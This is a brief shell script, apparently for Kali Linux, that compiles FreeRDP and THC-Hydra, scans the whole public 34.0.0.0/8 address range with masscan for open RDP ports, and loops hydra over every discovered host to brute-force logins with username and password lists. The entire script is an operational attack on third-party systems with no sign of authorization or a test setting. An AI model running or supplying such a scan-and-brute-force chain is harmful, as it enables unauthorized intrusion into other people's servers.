# TESTED ON KALI LINUX
apt update && apt install build-essential zlib1g-dev cmake masscan libpcap-dev libssl-dev -y;
git clone https://github.com/FreeRDP/FreeRDP.git;
cd FreeRDP;
cmake .;
make -j8;
make install;
cd ..;
git clone https://github.com/vanhauser-thc/thc-hydra.git;
cd thc-hydra;
./configure && make -j8 && make install;
cd ..;
masscan --range 34.0.0.0-34.255.255.255 --rate 50000 -p3389 --open --banners -oG rdp.scan;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" rdp.scan`; do hydra -vv rdp://$i -e ns -L user -P pass -t1 -W1 -I >hydra.log;
done
